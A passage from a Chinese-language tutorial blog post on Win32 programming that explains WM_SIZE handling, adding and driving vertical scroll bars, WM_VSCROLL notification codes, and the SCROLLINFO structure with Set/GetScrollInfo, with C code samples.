class="number">0</span>;</span><br><span class="line">   <span class="keyword">case</span> ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中LOWORD和HIWORD是定义在WINDEF.H中的两个宏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span></span><br></pre></td></tr></table></figure>
<p>LOWORD(l)就是不管l啥类型,对l取双字然后和<code>0xFFFF</code>全一的字按位与,即保留低字</p>
</blockquote>
<p>在处理WM_SIZE消息时只负责计算出新的客户区宽高,重绘它是一点儿也不用管,因为一般WM_SIZE消息之后会有一个WM_PAINT消息接踵而至,重绘的工作在WM_PAINT中完成</p>
<p>这样看一切都合理了,处理WM_SIZE相当于为处理WM_PAINT预处理,计算客户区大小</p>
<p>但是窗口第一次显式出来的时候呢?WM_SIZE不是说得在窗口大小发生变化时才会收到吗?</p>
<p>事实上WM_CREATE之后不会立刻传递WM_PAINT进行绘制,而是会先传递WM_SIZE,可以理解为窗口从无到有也包含了客户区的尺寸变化</p>
<p>这样改进之后的WM_PAINT处理过程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MAXLINES = cyClient / cyChar;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; min(NUMLINES,MAXLINES); ++i) &#123;</span><br><span class="line">	TextOut(hdc, <span class="number">10</span>, i * cyChar, sysmetrics[i].szLabel,lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">	TextOut(hdc, <span class="number">40</span> * cxCaps, i * cyChar, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">	wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].Index));</span><br><span class="line">	SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">	TextOut(hdc, <span class="number">80</span> * cxCaps, i * cyChar, szBuffer, lstrlen(szBuffer));</span><br><span class="line">	SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
<p>首先MAXLINES计算得到当前客户区最大能够容纳的完整行数,然后下面打印的时候取现有行数和能够打印的最大完整行数最小值.</p>
<p>这样就不会在客户区最底下打印出短斤少两的半行了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807165837263.png"
alt="image-20220807165837263" />
<figcaption aria-hidden="true">image-20220807165837263</figcaption>
</figure>
<p>但是这样没有解决不能显式完全的问题,甚至说只能解决边界上的显式好不好看问题,真是吹毛求疵</p>
<p>要用有限的屏幕空间浏览长于一个屏幕的信息,最好的方法就是添加一个滚动条,拖到下面看下面,拖到上面看上面,</p>
<p>比如任务管理器的滚动条</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807170100222.png"
alt="image-20220807170100222" />
<figcaption aria-hidden="true">image-20220807170100222</figcaption>
</figure>
<h2 id="滚动条">滚动条</h2>
<p>滚动条的效果就类似拿着放大镜看一个巨大的报纸,但是放大镜固定不动,动的是报纸</p>
<p>下滑滚动条就是报纸往彼方移动,相当于放大镜往己方移动</p>
<blockquote>
<p>与其说是放大镜,不如说是一张扣了个方框的不透明纸压在报纸上,透过这个方框看报纸</p>
</blockquote>
<h3 id="添加滚动条">添加滚动条</h3>
<p>滚动条属于窗口实例的风格,只需要在实例化窗口对象的时候往窗口对象风格标识符上按位与上滚动条特性<code>WS_VSCROLL|WS_HSCROLL</code>垂直滚动条|水平滚动条</p>
<p>比如:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(szAppName, TEXT(<span class="string">&quot;Get System Metrics No. 1&quot;</span>),</span><br><span class="line">	WS_OVERLAPPEDWINDOW| WS_VSCROLL | WS_HSCROLL,<span class="comment">//此处加入滚动条属性</span></span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">	CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>之后的效果如图:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807171154754.png"
alt="image-20220807171154754" />
<figcaption aria-hidden="true">image-20220807171154754</figcaption>
</figure>
<p>确实窗口右侧和下方都出现了滚动条</p>
<p>但是这时候拖动滚动条是没有效果的,它只是个摆设</p>
<p>Windows操作系统负责处理滚动条上的鼠标动作,但是不负责键盘接口.如果想要通过键盘控制滚动条,需要显式给出对应关系,但这是后话,目前的任务是给滚动条加上管理范围,让它不是摆设</p>
<blockquote>
<p>Windows操作系统和应用程序</p>
</blockquote>
<h3 id="位置和范围">位置和范围</h3>
<p>范围是一对整数,表明滚动条的最小值和最大值</p>
<p>位置是滑块实时在这个范围中的值,位置永远属于是范围这个整数集合</p>
<p>默认滚动条的范围是<code>[0,100)</code></p>
<h4 id="范围">范围</h4>
<p>可以调用setScrollRange修改其范围</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetScrollRange</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND hWnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nBar,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nMinPos,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>  nMaxPos,</span></span><br><span class="line"><span class="params">  [in] BOOL bRedraw</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 89%" />
</colgroup>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>hwnd</td>
<td>窗口实例的句柄</td>
</tr>
<tr>
<td>nBar</td>
<td>标志滚动条的类型,是水平还是垂直</td>
</tr>
<tr>
<td>nMinPos</td>
<td>滚动条最小范围</td>
</tr>
<tr>
<td>nMaxPos</td>
<td>滚动条最大范围</td>
</tr>
<tr>
<td>bRedraw</td>
<td>规定是否重绘滚动条,可以在下一次显示前,所有对滚动条的修改完成之后,再规定为TRUE表明重绘</td>
</tr>
</tbody>
</table>
<h5 id="设置滚动条范围">设置滚动条范围</h5>
<p>当滚动条范围是<code>[0,NUMLINES-1]</code>,当滑块位置是0,此时第一条文本显示在客户区最上方,下面顺次是第2条文本,第3条...这样是合理的</p>
<p>当滑块位置是NUMLINES-1,此时最后一条文本显示在客户区<strong>最上方</strong>,下面全都是空白.显然着这不合理.</p>
<p>怎么样让滑块最远到达的位置,使得最后一条文本显示 在客户区的最下方?</p>
<blockquote>
<p>假设客户区大小100,需要打印1000行,当滑块在0时可以显示第1到100行,当滑块在1时可以显示第2到101行,当滑块在900时,可以显示第901到1000行</p>
<p>因此只需要NUMLINES-cyClient就可以实现</p>
</blockquote>
<p>啥时候更新滚动条范围呢?NUMLINES是一个常数,cyClient客户区垂直行数是一个变量,因此滚动条范围上界可以跟随cyClient变化</p>
<p>都在处理WM_SIZE时修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxClient = LOWORD(lParam);</span><br><span class="line">	cyClient = HIWORD(lParam);</span><br><span class="line">	iVscrollMax = max(<span class="number">0</span>, NUMLINES - cyClient / cyChar);<span class="comment">//非负</span></span><br><span class="line">	SetScrollRange(hwnd, SB_VERT, <span class="number">0</span>, iVscrollMax, TRUE);<span class="comment">//修改范围</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="位置">位置</h4>
<p>滑块的位置是一个整数,比如当滚动条范围是<code>[0,1024)</code></p>
<p>那么滑块的位置就有0,1,2,...,1022,1023,总共1024种情况</p>
<p>必须使用<code>SetScrollPos</code>函数修改滑块的位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> SetScrollPos（HWN hWnd，<span class="type">int</span> nBar，<span class="type">int</span> nPos，BOOL bRedraw）;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>hwnd</td>
<td>窗口实例的句柄</td>
</tr>
<tr>
<td>nBar</td>
<td>标志滚动条的类型,是水平还是垂直</td>
</tr>
<tr>
<td>nPos</td>
<td>滑块新位置,该值需要介于滚动条的范围内</td>
</tr>
<tr>
<td>bRedraw</td>
<td>规定是否重绘滚动条,同SetScrollRange中的bRedraw参数</td>
</tr>
</tbody>
</table>
<p>程序和windows操作系统合作处理滚动条上的动作</p>
<blockquote>
<p>windows操作系统:</p>
<p>处理滚动条中的所有鼠标信息,</p>
<p>当鼠标拖动滑块的时候高亮</p>
<p>当用户拖动滑块的时候,在滚动条内移动滑块</p>
<p>向拥有滚动条的窗口过程发送滚动条消息</p>
<p>程序:</p>
<p>初始化滚动条的范围和位置</p>
<p>处理传送给窗口过程的滚动条信息</p>
<p>更新滑块的位置</p>
<p>根据滚动条的变化更新客户区的内容</p>
</blockquote>
<h3 id="处理滚动条消息">处理滚动条消息</h3>
<p>单击滚动条或者拖动滑块会导致windows向窗口过程发送WM_VSCROLL或者WM_HSCROLL消息</p>
<p>此时wParam和lParam参数就有实际意义了.其中lParam用于滚动条是子窗口.wParam用于滚动条是窗口的一部分,目前只使用wParam就足够了</p>
<p>wParam是一个无符号32位双字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typedef _W64 unsigned int UINT_PTR, *PUINT_PTR;</span><br><span class="line">typedef UINT_PTR            WPARAM;</span><br></pre></td></tr></table></figure>
<p>其低位字代表了鼠标在滚动条的动作,又称为"通知码",低位字的枚举值在winuser.h中有定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#define SB_LINEUP 0</span><br><span class="line">#define SB_LINELEFT 0</span><br><span class="line">#define SB_LINEDOWN 1</span><br><span class="line">#define SB_LINERIGHT 1</span><br><span class="line">#define SB_PAGEUP 2</span><br><span class="line">#define SB_PAGELEFT 2</span><br><span class="line">#define SB_PAGEDOWN 3</span><br><span class="line">#define SB_PAGERIGHT 3</span><br><span class="line">#define SB_THUMBPOSITION 4</span><br><span class="line">#define SB_THUMBTRACK 5</span><br><span class="line">#define SB_TOP 6</span><br><span class="line">#define SB_LEFT 6</span><br><span class="line">#define SB_BOTTOM 7</span><br><span class="line">#define SB_RIGHT 7</span><br><span class="line">#define SB_ENDSCROLL 8</span><br></pre></td></tr></table></figure>
<p>各个枚举值的对应效果</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808081546006.png"
alt="image-20220808081546006" />
<figcaption aria-hidden="true">image-20220808081546006</figcaption>
</figure>
<p>wParam的高位字表示滑块位置</p>
<h3 id="使用滚动条">使用滚动条</h3>
<p>加入滚动条处理的WndProc函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> iVscrollPos;<span class="comment">//记录滑块位置</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxClient, cyClient;</span><br><span class="line">	TEXTMETRIC tm;</span><br><span class="line">	HDC hdc;</span><br><span class="line">	PAINTSTRUCT ps;</span><br><span class="line">	<span class="type">int</span> i,y;</span><br><span class="line">	TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">	RECT rect;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> (message) &#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);</span><br><span class="line">		cxChar = tm.tmAveCharWidth;</span><br><span class="line">		cxCaps = cxChar;</span><br><span class="line">		<span class="keyword">if</span> (tm.tmPitchAndFamily &amp; <span class="number">1</span>) &#123;</span><br><span class="line">			cxCaps = cxChar * <span class="number">3</span> / <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cyChar = tm.tmHeight + tm.tmExternalLeading;</span><br><span class="line"></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_SIZE:</span><br><span class="line">		cxClient = LOWORD(lParam);</span><br><span class="line">		cyClient = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_VSCROLL:</span><br><span class="line">		<span class="keyword">switch</span> (LOWORD(wParam)) &#123;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEUP:<span class="comment">//点击滚动条顶端的箭头导致滑块垂直位置上移一个单元</span></span><br><span class="line">				iVscrollPos -= <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEDOWN:</span><br><span class="line">			iVscrollPos += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEUP:<span class="comment">//点击滑块的滑道导致滑块垂直位移一页</span></span><br><span class="line">			iVscrollPos -= cyClient / cyChar;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEDOWN:</span><br><span class="line">			iVscrollPos += cyClient / cyChar;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_THUMBPOSITION:<span class="comment">//拖动滑块,其位置应该由wParam的高位字决定</span></span><br><span class="line">			iVscrollPos = HIWORD(wParam);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		iVscrollPos = max(<span class="number">0</span>, min(iVscrollPos, NUMLINES - <span class="number">1</span>));<span class="comment">//iVscrollPos不允许小于0,不允许比NUMLINES行大</span></span><br><span class="line">		<span class="keyword">if</span> (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123;<span class="comment">//测试一下本次滚动之后和上一次的位置是否相同,相同则不做修改</span></span><br><span class="line">			SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);</span><br><span class="line">			InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);<span class="comment">//本次滚动条动作处理完毕,整个窗口无效化,强制产生WM_PAINT消息,进行重绘处理</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_PAINT:</span><br><span class="line">		hdc = BeginPaint(hwnd,&amp;ps);</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; ++i) &#123;<span class="comment">//i最大不能超过现有行数</span></span><br><span class="line">			y = cyChar * (i - iVscrollPos);<span class="comment">//原来的第i行应该在客户区的第i-iVescrollPos行打印</span></span><br><span class="line">			TextOut(hdc, <span class="number">10</span>, y, sysmetrics[i].szLabel,lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">			TextOut(hdc, <span class="number">40</span> * cxCaps, y, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">			wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].Index));</span><br><span class="line">			SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">			TextOut(hdc, <span class="number">80</span> * cxCaps, y, szBuffer, lstrlen(szBuffer));</span><br><span class="line">			SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">		&#125;	</span><br><span class="line">		EndPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">		GetClientRect(hwnd, &amp;rect);</span><br><span class="line">		wsprintf(szBuffer, TEXT(<span class="string">&quot;%d&quot;</span>),cxClient);</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, szBuffer,TEXT(<span class="string">&quot;notice&quot;</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于绘图时的处理<code>y = cyChar * (i - iVscrollPos);</code>实际上干了一个将第i条作为客户区的第i-iVscrollPos行打印</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808084718857.png"
alt="image-20220808084718857" />
<figcaption aria-hidden="true">image-20220808084718857</figcaption>
</figure>
</blockquote>
<h4 id="立刻重绘-1">立刻重绘</h4>
<p>处理WM_VSCROLL时并没有立刻重绘客户区,而是调用InvalidateRect将这个皮球踢到下一次消息处理,WM_PAINT的处理.</p>
<p>WM_PAINT这个消息的优先级最低,当窗口过程的消息队列中有多种消息(比如多种对窗口有改动的消息)时,会首先处理其他消息,最后才会处理WM_PAINT消息.</p>
<blockquote>
<p>这就好比市领导要求某中学视察,苦逼老师们提前一周就得造假材料,补完教案.等这一些都忙活完了,到领导视察当天,把所有材料一汇总,呈递给领导审阅</p>
<p>造材料就相当于处理其他消息</p>
<p>处理WM_PAINT就是呈递的临门一脚</p>
</blockquote>
<p>如果要让WM_PAINT立刻被处理,需要在InvalidateRect之后立刻UpdateWindow</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123;</span><br><span class="line">	SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);</span><br><span class="line">	InvalidateRect(hwnd, NULL, TRUE);</span><br><span class="line">	UpdateWindow(hwnd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="getsetscrollinfo">Get/SetScrollInfo</h3>
<p>先前的窗口中,滑块的大小是固定的,那么一小点都点不到.</p>
<p>而人家的滑块似乎是和总行数挂钩的,总行数越少滑块越大</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808091255112.png"
alt="image-20220808091255112" />
<figcaption aria-hidden="true">image-20220808091255112</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808091242529.png"
alt="image-20220808091242529" />
<figcaption aria-hidden="true">image-20220808091242529</figcaption>
</figure>
<p>确实如此,理论上可以得到一个公式 <span class="math display">\[
\frac{滑块大小}{滚动条长度}=\frac{页面大小}{范围}=\frac{文档显示数量}{文档总大小}
\]</span></p>
<p><del>我们先进的Set/GetScrollInfo函数已经超过了老式的Set/GetScrollRange,Set/GetScrollPos函数</del>Set/GetScrollInfo就可以考虑这一点了</p>
<p>使用Set/GetScrollInfo完全可以做到先前的老式函数.</p>
<p>这俩函数可以设置/获得滚动条的所有信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSCROLLINFO</span> &#123;</span><span class="comment">//SCROLLINFO结构体</span></span><br><span class="line">  UINT cbSize;<span class="comment">//sizeof(SCROLLINFO)</span></span><br><span class="line">  UINT fMask;<span class="comment">//要设置或者获取的值</span></span><br><span class="line">  <span class="type">int</span>  nMin;<span class="comment">//范围最小值</span></span><br><span class="line">  <span class="type">int</span>  nMax;<span class="comment">//范围最大值</span></span><br><span class="line">  UINT nPage;<span class="comment">//页面大小</span></span><br><span class="line">  <span class="type">int</span>  nPos;<span class="comment">//当前位置</span></span><br><span class="line">  <span class="type">int</span>  nTrackPos;<span class="comment">//当前追踪位置</span></span><br><span class="line">&#125; SCROLLINFO, *LPSCROLLINFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">SetScrollInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND          hwnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>           nBar,<span class="comment">//要么是SB_VERT,要么是SB_HORZ,作用是决定滑块是水平还是垂直的</span></span></span><br><span class="line"><span class="params">  [in] LPCSCROLLINFO lpsi,<span class="comment">//lpsi规定了ScrollInfo结构体应该被设置成什么状态</span></span></span><br><span class="line"><span class="params">  [in] BOOL          redraw<span class="comment">//表示是否重绘滚动条</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">GetScrollInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HWND         hwnd,</span></span><br><span class="line"><span class="params">  [in]      <span class="type">int</span>          nBar,</span></span><br><span class="line"><span class="params">  [in, out] LPSCROLLINFO lpsi<span class="comment">//返回值用引用承载</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>奇怪的是,结构体的第一个成员是自己的大小,这不随便用<code>sizeof</code>一算就有了吗?</p>
<p>windows程序设计给出的解释是,方便以后扩充结构使用</p>
<blockquote>
<p>使用该结构体之前需要ixan将cbSize字段填充</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCROLLINFO si;</span><br><span class="line">si.cbSize=<span class="keyword">sizeof</span>(SCROLLINFO);</span><br></pre></td></tr></table></figure>
<p>真™抽象</p>
</blockquote>
<p>fMask有效值:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_RANGE 0x0001<span class="comment">//范围掩码,获取SCROLLINFO.nMIn,.mMax</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_PAGE 0x0002<span class="comment">//页面大小掩码,获取SCROLLINFO.nPage</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_POS 0x0004<span class="comment">//滑块位置掩码,获取SCROLLINFO.nPos</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_DISABLENOSCROLL 0x0008</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_TRACKPOS 0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_ALL (SIF_RANGE | SIF_PAGE | SIF_POS | SIF_TRACKPOS)</span></span><br></pre></td></tr></table></figure>
<p>不管是使用Set还是GetScrollInfo方法,引用传递的lpsi参数都要指定fMask这个成员</p>
<p>对于GetScrollInfo方法,指定了fMask=SIF_POS
,那么函数执行后lpsi引用的nPos就是有效值,其他成员无效</p>
<p>对于SetScrollInfo方法,指定了fMask=SIF_POS,那么函数根据lpsi的nPos值修改滚动条参数.其他成员不予理睬</p>
<h5 id="修改滑块位置">修改滑块位置</h5>
<p>使用SetScrollInfo改进的WM_CREATE处理函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SCROLLINFO si;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span> (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123;</span><br><span class="line">			si.fMask = SIF_POS;<span class="comment">//设置掩码,只改变nPos参数</span></span><br><span class="line">			SetScrollInfo(hwnd, SB_VERT, &amp;si, FALSE);<span class="comment">//不立刻重绘</span></span><br><span class="line">			InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);</span><br><span class="line">			UpdateWindow(hwnd);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<h5 id="设置滚动条范围-1">设置滚动条范围</h5>
